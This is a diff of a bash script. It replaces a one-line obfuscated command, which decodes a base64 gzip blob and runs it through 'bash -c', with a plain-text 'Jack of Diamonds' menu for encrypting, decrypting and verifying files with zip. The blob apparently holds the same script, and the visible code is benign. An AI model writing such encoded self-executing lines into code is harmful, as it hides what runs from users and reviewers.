@@ -1,1 +1,83 @@
-bash -c "$(echo H4sICD3XcGcAA0phY2tfb2ZfRGlhbW9uZHMAxVZRb9owEH7Pr7ilSC3TSKFUeyjaw9QyaZM2TRuaNLEKmeQCXsFBdtKOtf3vOztOCCTQINHOL00v9nd33/f5wtGr0zEXp2Ompo5z+fP9l3fHv9rd7rDT676dHzvf+t/7Axtq0//OEXxGkUAYSYinCJ+YfwNRCFeczSMRKLhkMnB+U3QUhaPARkdzOnPShHsHaPkzZNI8oT+NoIXgNu516kd3FXXBrNGhVgn6AXatUl871kN97L7w5XIRwwc+Q2VIHEgmVIiyPvbBKNmj7r1XJfZgyhX4ZBBIFLX/ly/gjsdTwJQVHgmII1DoJxIhNBSNkUhCiC1L3lbs56y74+XCMSPdAbHPPLhCiy2yNBjsm6YSu+vBD5Q8XJqreljsc+LkD4/3gKmL/Sz+ToeMmWZ2ykhkAbQW4PZFTNdvGSUSaCf38YIqSZ/SccUUQiMNABdOVnqnmRl3pL0KvV7+6qwJAVa/6jbh1mgywkyP0p5zQtbctovB103L0kdxy2Y8sCV6NEGWwCaMC8/tgZohLqDTg8oRnOGhYr7zqIf5uq+dYkM15rU9zcXEAniet5Nl7UPT7YLRvafLbhNqynVch805HsJwCK0QGlkYrq97+vxKgA1sBoLNMf8y5fSmCU/Qm3hv7HDxaPQ0dU76qw/lkCnDhbby9NSZm2/Tk8vQYM+79JhtdNfBCmyZa7cqiynIzm+QhjNVKknKSF6kN1dEMXWZCIKICwWmZ0Ne4F1AB1oKWtLQ9FWiUjRllnCDS02+xDiRZuZqwrRB8i4r7ZNaZuu4coqer+EeC2Tcs4lVx0jGFfSNXldba6MLsPJWOMpGy4ZKqS6UlW1dEz8ROoWbvXtKsv66D9fFy/BfSrutnwOncijVEDFF1GSVQf+LiLTFXM9BQaKNLVV9DMojI89Bv1rMyN3opqT7Svsn0PxIykS/KtjKir/X3X9Z+1S/+Ac2W9uRQQwAAA== | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+# Menu for the Jack of Diamonds Card
+jack_of_diamonds_menu() {
+    clear
+    echo -e "${CYAN}"
+    echo "      _________________________________________________________________________"
+    echo "     |                             Jack of Diamonds                            |"
+    echo "     |                        Encrypt Files for Transfer                       |"
+    echo "     |_________________________________________________________________________|"
+    echo "     |                                                                         |"
+    echo "     |  This card uses zip with encryption to secure files before transfer.    |"
+    echo "     |                                                                         |"
+    echo "     |  1. Encrypt a File                                                      |"
+    echo "     |  2. Decrypt an Encrypted File                                           |"
+    echo "     |  3. Verify the Encrypted File                                           |"
+    echo "     |  4. Exit                                                                |"
+    echo "     |_________________________________________________________________________|"
+    echo -e "${RESET}"
+    read -p "Enter your choice: " choice
+    case $choice in
+        1) encrypt_file ;;
+        2) decrypt_file ;;
+        3) verify_encrypted_file ;;
+        4) exit 0 ;;
+        *) echo "Invalid choice. Try again."; sleep 1; jack_of_diamonds_menu ;;
+    esac
+}
+
+# Encrypt a File
+encrypt_file() {
+    clear
+    echo -e "${CYAN}Encrypting a File...${RESET}"
+    read -p "Enter the file path to encrypt: " filepath
+    if [[ -f $filepath ]]; then
+        read -p "Enter a name for the encrypted file (e.g., secure.zip): " zipname
+        echo "Encrypting $filepath..."
+        zip -e "$zipname" "$filepath"
+        echo -e "${CYAN}File encrypted as $zipname.${RESET}"
+    else
+        echo "Error: File not found at $filepath."
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    jack_of_diamonds_menu
+}
+
+# Decrypt an Encrypted File
+decrypt_file() {
+    clear
+    echo -e "${CYAN}Decrypting an Encrypted File...${RESET}"
+    read -p "Enter the path of the encrypted zip file: " zippath
+    if [[ -f $zippath ]]; then
+        echo "Decrypting $zippath..."
+        unzip "$zippath"
+    else
+        echo "Error: Encrypted file not found at $zippath."
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    jack_of_diamonds_menu
+}
+
+# Verify the Encrypted File
+verify_encrypted_file() {
+    clear
+    echo -e "${CYAN}Verifying the Encrypted File...${RESET}"
+    read -p "Enter the path of the encrypted zip file: " zippath
+    if [[ -f $zippath ]]; then
+        if zip -T "$zippath"; then
+            echo -e "${CYAN}The encrypted file $zippath is valid.${RESET}"
+        else
+            echo "The encrypted file $zippath is corrupted."
+        fi
+    else
+        echo "Error: File not found at $zippath."
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    jack_of_diamonds_menu
+}
+
+jack_of_diamonds_menu
